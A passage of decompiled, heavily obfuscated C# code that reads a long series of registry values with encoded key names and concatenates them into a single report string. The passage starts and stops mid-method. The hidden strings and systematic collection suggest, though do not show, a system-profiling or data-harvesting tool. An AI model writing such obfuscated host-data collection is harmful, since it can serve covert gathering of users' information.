						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("LŀɎ\u0346ЦԵس\u0738࠸\u093a")), Registry.GetValue(GClass0.smethod_0("uŷɾ\u0363Ѧմٸݵ\u0874ॸ੬\u0b7f\u0c70൳\u0e67ཧ\u1063ᅩቷ፹ᑦᕮᙳ\u1771ᡤ\u1976\u1a66\u1b7eᱤᵌṺώ\u2069Ⅾ≴⍴⑰╻☷❗⡧⥠⩠⭎ⱔⵑⸯ⽝ぽㅣ㉹㍾㑺㕔㙁㝏㡃㥅㨣㬲㰶"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_300d;
						IL_300d:
						num = 261;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒ\u2d7a\u2e70⽷でㅠ㉾㍾㑦㕭㘭㝍㡹㥾㩺㭔㱁㵏㹃㽅䀣䄲䈹"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3040;
						}
						goto IL_309a;
						IL_3040:
						num = 262;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("LŀɎ\u0346ЦԵؼ\u0738࠸\u093a")), Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒ\u2d7a\u2e70⽷でㅠ㉾㍾㑦㕭㘭㝍㡹㥾㩺㭔㱁㵏㹃㽅䀣䄲䈹"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_309a;
						IL_309a:
						num = 264;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0001ăȂ\u031fКԈ،܁ࠀऌ\u0a60୳౼ൿ\u0e73\u0f73ၷᅽቫ፥ᑺᕲᙧᝥᡰᥢ\u1a6a\u1b72ᱨᵀṎὉ⁝⅚≈⍈\u244c╇☃❣⡓⥔⩬⭂ⱘⵝ⸻⽞ばㅫ㉣㍤㑼㕶㙦㝦㡸㥿㩡㭒㱋㵾㹮㽯䁭䅧䉪䌦䑃䕫䙱䝡䡤"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_30cd;
						}
						goto IL_3127;
						IL_30cd:
						num = 265;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("VŽɫ\u0368Ѩդ٧ܩࡎ२ੴ୦ౡസ\u0e38༺")), Registry.GetValue(GClass0.smethod_0("\u0001ăȂ\u031fКԈ،܁ࠀऌ\u0a60୳౼ൿ\u0e73\u0f73ၷᅽቫ፥ᑺᕲᙧᝥᡰᥢ\u1a6a\u1b72ᱨᵀṎὉ⁝⅚≈⍈\u244c╇☃❣⡓⥔⩬⭂ⱘⵝ⸻⽞ばㅫ㉣㍤㑼㕶㙦㝦㡸㥿㩡㭒㱋㵾㹮㽯䁭䅧䉪䌦䑃䕫䙱䝡䡤"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3127;
						IL_3127:
						num = 267;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("tŰɿ\u0360ѧջٹݶ\u0875ॿ੭\u0b7c\u0c71൬\u0e66ཤ\u1062ᅮቶ፺ᑧᕡᙲ\u1772ᡥᥱ\u1a67\u1b7dᱴᵗṏὁ⁚Ⅹ≵⍷⑬╻♿❻⡱⥠⨨⬱ⱖ\u2d7a\u2e6b⽡\u302cㅤ㉬㌩㑟㕦㙴㜥㡆㥦㩶㭠"), GClass0.smethod_0("ZŻɧ\u0363ѳզ\u0670\u0748ࡧॸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_315a;
						}
						goto IL_31b4;
						IL_315a:
						num = 268;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("UŧɴͼЯա٫ܬ\u085c५\u0a7bନ\u0c45\u0d63\u0e71ཥ\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("tŰɿ\u0360ѧջٹݶ\u0875ॿ੭\u0b7c\u0c71൬\u0e66ཤ\u1062ᅮቶ፺ᑧᕡᙲ\u1772ᡥᥱ\u1a67\u1b7dᱴᵗṏὁ⁚Ⅹ≵⍷⑬╻♿❻⡱⥠⨨⬱ⱖ\u2d7a\u2e6b⽡\u302cㅤ㉬㌩㑟㕦㙴㜥㡆㥦㩶㭠"), GClass0.smethod_0("ZŻɧ\u0363ѳզ\u0670\u0748ࡧॸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_31b4;
						IL_31b4:
						num = 270;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u007fŽɰ\u036dѬվپݳ\u086e\u0962ੲୡ౪൩\u0e61ཡ\u1069ᅣቹ፷ᑬᕤᙵ\u1777ᡞ᥌\u1a58\u1b40ᱏᵒṈὄ⁑Ⅴ≺⍺⑧╾♸❾⡪⥽⨷⬬ⱍ\u2d7f\u2e6c⽤〧ㅩ㉣㌤㑔㕣㙳"), GClass0.smethod_0("ZŻɧ\u0363ѳզ\u0670\u0748ࡧॸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_31e7;
						}
						goto IL_3241;
						IL_31e7:
						num = 271;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("HŸɩ\u0367Ъզٮܧࡑ।੶ସసഺ")), Registry.GetValue(GClass0.smethod_0("\u007fŽɰ\u036dѬվپݳ\u086e\u0962ੲୡ౪൩\u0e61ཡ\u1069ᅣቹ፷ᑬᕤᙵ\u1777ᡞ᥌\u1a58\u1b40ᱏᵒṈὄ⁑Ⅴ≺⍺⑧╾♸❾⡪⥽⨷⬬ⱍ\u2d7f\u2e6c⽤〧ㅩ㉣㌤㑔㕣㙳"), GClass0.smethod_0("ZŻɧ\u0363ѳզ\u0670\u0748ࡧॸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3241;
						IL_3241:
						num = 273;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4fᱚᵴṱὫ\u2062Ⅴ≫⍣⑾╕♏❢⡲⥗⩭⭤ⱪ\u2d75"), GClass0.smethod_0("Aŗɧ\u036cѦդ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3274;
						}
						goto IL_32ce;
						IL_3274:
						num = 274;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Lůɽ\u035aѮա٭ݰ࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4fᱚᵴṱὫ\u2062Ⅴ≫⍣⑾╕♏❢⡲⥗⩭⭤ⱪ\u2d75"), GClass0.smethod_0("Aŗɧ\u036cѦդ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_32ce;
						IL_32ce:
						num = 276;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u000eĎȁ\u031aНԍ؏ݼ\u087fॱ\u0a63୶౻ൺ\u0e70\u0f7eၸᅰቨ፠ᑽᕷᙤ\u1778ᡯ\u197f\u1a69᭷ᱯᵅṍὄ⁒⅗≋⍍\u244b╂☀❞⡬⥩⩯⭇\u2c5fⵘ⸸⽐しㅘ㉑㍀㑎㕖㙼㝠㡬㥬㩠㬫㱅㵹㹭㽵䁧䅱䉭䍬䑬䕲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3301;
						}
						goto IL_335b;
						IL_3301:
						num = 277;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Sſɽͳѱգخ\u0742\u087c८\u0a78୨౼൮\u0e69ཫၷᄸሸጺ")), Registry.GetValue(GClass0.smethod_0("\u000eĎȁ\u031aНԍ؏ݼ\u087fॱ\u0a63୶౻ൺ\u0e70\u0f7eၸᅰቨ፠ᑽᕷᙤ\u1778ᡯ\u197f\u1a69᭷ᱯᵅṍὄ⁒⅗≋⍍\u244b╂☀❞⡬⥩⩯⭇\u2c5fⵘ⸸⽐しㅘ㉑㍀㑎㕖㙼㝠㡬㥬㩠㬫㱅㵹㹭㽵䁧䅱䉭䍬䑬䕲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_335b;
						IL_335b:
						num = 279;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑛᕕᙆᝆᡑᥝᩋ᭑ᱚᵪṦ\u1f7f\u206d⅛≁⍰⑪╮♣❯"), GClass0.smethod_0("[Ţɲͱѭխ٥ݲ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_338e;
						}
						goto IL_33e8;
						IL_338e:
						num = 280;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("NŽɩ\u036bѤժظ\u0738࠺")), Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑛᕕᙆᝆᡑᥝᩋ᭑ᱚᵪṦ\u1f7f\u206d⅛≁⍰⑪╮♣❯"), GClass0.smethod_0("[Ţɲͱѭխ٥ݲ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_33e8;
						IL_33e8:
						num = 282;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("{Źɴ\u0369Ѱբ٢ݯࡪ०੶\u0b65౦\u0d65\u0e6d\u0f6d\u106dᅧች፳ᑐᕘᙉᝋᡚ᥈\u1a5c\u1b44᱁ᵷṹὢ⁶ⅎ≙⍱④╨☠❀⡢⥬⩬⭔ⱔⵣ\u2e71⽰なㅬ㉦"), GClass0.smethod_0("Hŧɸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_341b;
						}
						goto IL_3475;
						IL_341b:
						num = 283;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("DŪɦ\u036fХՋٯݣࡡसਸ\u0b3a")), Registry.GetValue(GClass0.smethod_0("{Źɴ\u0369Ѱբ٢ݯࡪ०੶\u0b65౦\u0d65\u0e6d\u0f6d\u106dᅧች፳ᑐᕘᙉᝋᡚ᥈\u1a5c\u1b44᱁ᵷṹὢ⁶ⅎ≙⍱④╨☠❀⡢⥬⩬⭔ⱔⵣ\u2e71⽰なㅬ㉦"), GClass0.smethod_0("Hŧɸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3475;
						IL_3475:
						num = 285;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶ᱬᵄṂὅ⁑⅖≌⍌⑈╃☿❟⡯⥨⩨⭆ⱜⵙ⸷⽑ぴㅹ㉶㍡㑍㕘㙪㝢㡡㥫㩪㭾㱬㴲㸧㽊䁪䅪䉧䍭䑯"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_34a8;
						}
						goto IL_3502;
						IL_34a8:
						num = 286;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("[ŷɽͼѨկٹݩ࠱प\u0a45୧౩\u0d62\u0e6aཪ\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶ᱬᵄṂὅ⁑⅖≌⍌⑈╃☿❟⡯⥨⩨⭆ⱜⵙ⸷⽑ぴㅹ㉶㍡㑍㕘㙪㝢㡡㥫㩪㭾㱬㴲㸧㽊䁪䅪䉧䍭䑯"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3502;
						IL_3502:
						num = 288;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱮᵊṉὑ⁐⅋≎⍎\u243f╍♲❺⡯⥭⩶⭪ⱼⵥ⹉⽜ぺㅶ㉵㍵㑡㔮㘫㜬㡏㥫㩧㭯㱢㵴㹪㽱䁰䄢䈳"), GClass0.smethod_0("hŧɸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3535;
						}
						goto IL_358f;
						IL_3535:
						num = 289;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("_ſɱͰѶռر\u0736\u082f\u094a੬\u0b62౬൯\u0e7bཧ\u1072ᅵሥጶᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱮᵊṉὑ⁐⅋≎⍎\u243f╍♲❺⡯⥭⩶⭪ⱼⵥ⹉⽜ぺㅶ㉵㍵㑡㔮㘫㜬㡏㥫㩧㭯㱢㵴㹪㽱䁰䄢䈳"), GClass0.smethod_0("hŧɸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_358f;
						IL_358f:
						num = 291;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4fᱛᵖṙἯ‼ℭ≞⍮⑾╨♡❫⡚⥆⩀⭈Ⱨ\u2d78"), GClass0.smethod_0("Fŀɨ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_35c2;
						}
						goto IL_361c;
						IL_35c2:
						num = 292;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("FŉɄ\u032cйԪ\u065bݭ\u0873१੬୨సസ\u0e3a")), Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑕᕟᙌᝀᡗ᥇ᩑ\u1b4fᱛᵖṙἯ‼ℭ≞⍮⑾╨♡❫⡚⥆⩀⭈Ⱨ\u2d78"), GClass0.smethod_0("Fŀɨ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_361c;
						IL_361c:
						num = 294;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("nŮɡͺѽխٯݜ\u085f\u0951\u0a43\u0b56\u0c5b൚๐ཞ\u1058ᅐቈፀᑝᕗᙄ\u1758ᡏᥟᩉ᭗\u1c4bᵡṭὦ\u2062⅙≍⍭⑁╅"), GClass0.smethod_0("Kůɦ\u0361ѭձ٤"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_364f;
						}
						goto IL_36a9;
						IL_364f:
						num = 295;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("NŨɆ\u0340иԸغ")), Registry.GetValue(GClass0.smethod_0("nŮɡͺѽխٯݜ\u085f\u0951\u0a43\u0b56\u0c5b൚๐ཞ\u1058ᅐቈፀᑝᕗᙄ\u1758ᡏᥟᩉ᭗\u1c4bᵡṭὦ\u2062⅙≍⍭⑁╅"), GClass0.smethod_0("Kůɦ\u0361ѭձ٤"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_36a9;
						IL_36a9:
						num = 297;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("nŮɡͺѽխٯݜ\u085f\u0951\u0a43\u0b56\u0c5b൚๐ཞ\u1058ᅐቈፀᑝᕗᙄ\u1758ᡏᥟᩉ᭗\u1c4bᵡṭὦ\u2062⅙≍⍭⑁╅"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_36dc;
						}
						goto IL_3736;
						IL_36dc:
						num = 298;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("NŨɆ\u0340иԸغ")), Registry.GetValue(GClass0.smethod_0("nŮɡͺѽխٯݜ\u085f\u0951\u0a43\u0b56\u0c5b൚๐ཞ\u1058ᅐቈፀᑝᕗᙄ\u1758ᡏᥟᩉ᭗\u1c4bᵡṭὦ\u2062⅙≍⍭⑁╅"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3736;
						IL_3736:
						num = 300;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("}ſɶ\u036bѮռ٠ݭ\u086cॠੴ୧౨൫\u0e6f\u0f6f\u106bᅡቿ፱ᑮᕦᙋᝉᡜ᥎\u1a5eᭆ᱓ᵷṀό⁺⅐≏⍛⑿╣♻❯⡡⥠⩮⭮ⱎ\u2d69\u2e6a⽣ぶㅘ㉊㍅㐳"), GClass0.smethod_0("vŷɲ\u0368ѧո"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3769;
						}
						goto IL_37c3;
						IL_3769:
						num = 301;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Ołȶ\u0338иԺ")), Registry.GetValue(GClass0.smethod_0("}ſɶ\u036bѮռ٠ݭ\u086cॠੴ୧౨൫\u0e6f\u0f6f\u106bᅡቿ፱ᑮᕦᙋᝉᡜ᥎\u1a5eᭆ᱓ᵷṀό⁺⅐≏⍛⑿╣♻❯⡡⥠⩮⭮ⱎ\u2d69\u2e6a⽣ぶㅘ㉊㍅㐳"), GClass0.smethod_0("vŷɲ\u0368ѧո"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_37c3;
						IL_37c3:
						num = 303;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑭᕧᙴᝈᡟ᥏\u1a59ᭇᱛᵏṛὸ⁸Ⅳ≱⍡⑦╴♢❓⡧⥝⩣⭯Ⱚⵊ\u2e67⽩ばㅠ㉶㍷㑧㕳"), GClass0.smethod_0("Cŵɨ\u0367Ѿոٹݫ\u087dॡ੨୨థ\u0d47\u0e6cས\u1064"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_37f6;
						}
						goto IL_3850;
						IL_37f6:
						num = 304;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("xŀɠ\u036aЭՏ٤ݤ\u087f७\u0a75୲ౠ൶\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑭᕧᙴᝈᡟ᥏\u1a59ᭇᱛᵏṛὸ⁸Ⅳ≱⍡⑦╴♢❓⡧⥝⩣⭯Ⱚⵊ\u2e67⽩ばㅠ㉶㍷㑧㕳"), GClass0.smethod_0("Cŵɨ\u0367Ѿոٹݫ\u087dॡ੨୨థ\u0d47\u0e6cས\u1064"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3850;
						IL_3850:
						num = 306;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑭᕧᙴᝈᡟ᥏\u1a59ᭇᱛᵏṛὸ⁸Ⅳ≱⍡⑦╴♢❓⡧⥝⩣⭯Ⱚⵊ\u2e67⽩ばㅠ㉶㍷㑧㕳"), GClass0.smethod_0("\\ŻɢʹХՊ٢ݯࡤ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3883;
						}
						goto IL_38dd;
						IL_3883:
						num = 307;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("xŀɠ\u036aЭՏ٤ݤ\u087f७\u0a75୲ౠ൶\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑭᕧᙴᝈᡟ᥏\u1a59ᭇᱛᵏṛὸ⁸Ⅳ≱⍡⑦╴♢❓⡧⥝⩣⭯Ⱚⵊ\u2e67⽩ばㅠ㉶㍷㑧㕳"), GClass0.smethod_0("\\ŻɢʹХՊ٢ݯࡤ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_38dd;
						IL_38dd:
						num = 309;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0005ćȎ\u0313ЖԄ؈܅ࠄईਜଏ\u0c00\u0d03\u0e77\u0f77\u1073ᅹቧ፩ᑶᕾᙣᝡᡴᥦ\u1a76\u1b6eᱴᵜṊὍ⁙⅞≄⍄⑀╋☇❧⡗⥐⩐⭾Ɽⵡ⸿⽙ぜㅑ㉞㍉㑅㕒㙶㝻㡰㥧㨳㭐㱾㵾㹫㼮䀽䄼䈼䌪䑇䕡䙠䝮䡱䥢䩪䭰䱤"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3910;
						}
						goto IL_396a;
						IL_3910:
						num = 310;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("QŻɴͽѤԶ\u0657ݻ\u087dॶ\u0a31ଠ\u0c3fഹอག\u1062ᅭቡ፼ᑡᕯᙷᝡᠸ\u1938ᨺ")), Registry.GetValue(GClass0.smethod_0("\u0005ćȎ\u0313ЖԄ؈܅ࠄईਜଏ\u0c00\u0d03\u0e77\u0f77\u1073ᅹቧ፩ᑶᕾᙣᝡᡴᥦ\u1a76\u1b6eᱴᵜṊὍ⁙⅞≄⍄⑀╋☇❧⡗⥐⩐⭾Ɽⵡ⸿⽙ぜㅑ㉞㍉㑅㕒㙶㝻㡰㥧㨳㭐㱾㵾㹫㼮䀽䄼䈼䌪䑇䕡䙠䝮䡱䥢䩪䭰䱤"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_396a;
						IL_396a:
						num = 312;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᰖᵀḓ\u1f7e\u2072⅔≾⍪⑨╯☻❖⡼⥿⩲⭸ⱱⵧ⸳⽽ぷ\u3130㉂㍧㑪㕤㙿㜪㡨㥦㩣㬦㱈㵥㹤㽫䁢"), GClass0.smethod_0("MŸɿͿѥդ٭ݵࡈ॰੩ୡ౧൳"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_399d;
						}
						goto IL_39f7;
						IL_399d:
						num = 313;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("wŗɃ\u0355ѕլؾݑ\u0879ॼ\u0a7f୷౼\u0d64\u0e36\u0f7a\u1072ᄳ\u125f፸ᑷᕧᙺᜭᡭᥥ\u1a6eᬩ᱅ᵦṡὬ\u2067ℸ∸⌺")), Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᰖᵀḓ\u1f7e\u2072⅔≾⍪⑨╯☻❖⡼⥿⩲⭸ⱱⵧ⸳⽽ぷ\u3130㉂㍧㑪㕤㙿㜪㡨㥦㩣㬦㱈㵥㹤㽫䁢"), GClass0.smethod_0("MŸɿͿѥդ٭ݵࡈ॰੩ୡ౧൳"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_39f7;
						IL_39f7:
						num = 315;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("sűɼ\u0361Ѩպٺݷ\u0872ॾ੮\u0b7d౮൭\u0e65ཥၥᅯት፻ᑨᕠᙱ\u1773ᡢᥰ\u1a64᭼᱒ᵿṾὮ⁴ⅷ≼⍼⑾╷♉❒⡿⥳⩢⭸ⱓⴹ⹑⽞のㅭ㉠㍻㑳㕴㙤㝰㡪㥭㩯"), GClass0.smethod_0("^ũɹ\u0363Ѩդا\u0748\u0870३\u0a61୧\u0c73"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3a2a;
						}
						goto IL_3a84;
						IL_3a2a:
						num = 316;
